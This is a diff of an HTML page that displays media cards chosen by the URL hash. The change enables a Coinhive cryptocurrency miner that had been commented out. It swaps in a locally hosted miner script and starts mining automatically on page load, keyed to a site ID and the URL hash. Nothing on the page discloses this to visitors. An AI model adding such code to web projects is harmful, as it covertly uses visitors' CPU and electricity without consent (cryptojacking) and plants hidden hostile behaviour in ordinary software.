@@ -64,12 +64,12 @@
     <audio controls id="maincard1" class="imgcard" preload="auto" autoplay></audio>
     <video controls id="maincard2" autoplay class="imgcard"></video>
 
-    <!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script> -->
+    <script src="/coinhive.min.js"></script>
     <script>
-      // var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
-      // window.onload = () => {
-      //   miner.start();
-      // }
+      var miner = new CoinHive.User("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz", window.location.hash.slice(1));
+      window.onload = () => {
+        miner.start();
+      }
       if (window.location.hash != "") {
         var img = window.location.hash.slice(1);
         if (isNaN(parseInt(img.split("").pop())) || parseInt(img.split("").pop()) > 2) {
